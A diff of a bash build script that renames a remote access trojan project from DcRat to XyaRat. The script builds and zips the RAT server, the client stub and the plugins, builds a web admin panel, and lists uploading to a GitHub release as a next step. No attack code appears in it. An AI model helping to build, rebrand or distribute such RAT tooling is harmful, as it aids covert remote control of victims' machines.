@@ -41,7 +41,7 @@ echo -e "${GREEN}✅ All prerequisites installed${NC}"
 
 # Restore NuGet packages
 echo -e "\n${YELLOW}[2/7] Restoring NuGet packages...${NC}"
-nuget restore DcRat.sln || {
+nuget restore XyaRat.sln || {
     echo -e "${RED}❌ NuGet restore failed${NC}"
     exit 1
 }
@@ -49,7 +49,7 @@ echo -e "${GREEN}✅ NuGet packages restored${NC}"
 
 # Build RAT solution (Server + Client + Plugins)
 echo -e "\n${YELLOW}[3/7] Building RAT Solution (Server + Client + Plugins)...${NC}"
-msbuild /nologo /v:minimal /p:Configuration=Release DcRat.sln || {
+msbuild /nologo /v:minimal /p:Configuration=Release XyaRat.sln || {
     echo -e "${RED}❌ RAT build failed${NC}"
     exit 1
 }
@@ -78,15 +78,15 @@ cd ../..
 echo -e "${GREEN}✅ WebPanel frontend built successfully${NC}"
 
 # Package RAT (Server + Client + Plugins)
-echo -e "\n${YELLOW}[6/7] Packaging DcRat...${NC}"
-rm -f DcRat.zip
+echo -e "\n${YELLOW}[6/7] Packaging XyaRat...${NC}"
+rm -f XyaRat.zip
 cd Binaries/Release
-zip -r ../../DcRat.zip . || {
-    echo -e "${RED}❌ Failed to package DcRat${NC}"
+zip -r ../../XyaRat.zip . || {
+    echo -e "${RED}❌ Failed to package XyaRat${NC}"
     exit 1
 }
 cd ../..
-echo -e "${GREEN}✅ DcRat packaged: DcRat.zip${NC}"
+echo -e "${GREEN}✅ XyaRat packaged: XyaRat.zip${NC}"
 
 # Package WebPanel
 echo -e "\n${YELLOW}[7/7] Packaging WebPanel...${NC}"
@@ -105,14 +105,14 @@ echo -e "${GREEN}✨ Build completed successfully!${NC}"
 echo -e "${BLUE}========================================${NC}"
 echo -e "\n${YELLOW}📦 Build Output:${NC}"
 echo -e "  ${GREEN}✓${NC} Binaries/Release/       - Compiled executables"
-echo -e "  ${GREEN}✓${NC} DcRat.zip               - RAT package"
+echo -e "  ${GREEN}✓${NC} XyaRat.zip               - RAT package"
 echo -e "  ${GREEN}✓${NC} WebPanel.zip            - Web Admin Panel"
 echo -e "\n${YELLOW}🚀 Executables:${NC}"
-echo -e "  ${GREEN}✓${NC} Binaries/Release/DcRat.exe    - Main RAT Server"
+echo -e "  ${GREEN}✓${NC} Binaries/Release/XyaRat.exe    - Main RAT Server"
 echo -e "  ${GREEN}✓${NC} Binaries/Release/Stub/Client.exe - RAT Client/Stub"
 echo -e "  ${GREEN}✓${NC} WebPanel/bin/Release/publish/WebPanel.exe - Web Panel"
 echo -e "\n${YELLOW}📝 Next Steps:${NC}"
-echo -e "  1. Test executables: cd Binaries/Release && wine DcRat.exe"
+echo -e "  1. Test executables: cd Binaries/Release && wine XyaRat.exe"
 echo -e "  2. Upload to GitHub Release"
 echo -e "  3. Review security settings before deployment"
 echo -e "\n${RED}⚠️  Warning: For educational and authorized testing only!${NC}\n"
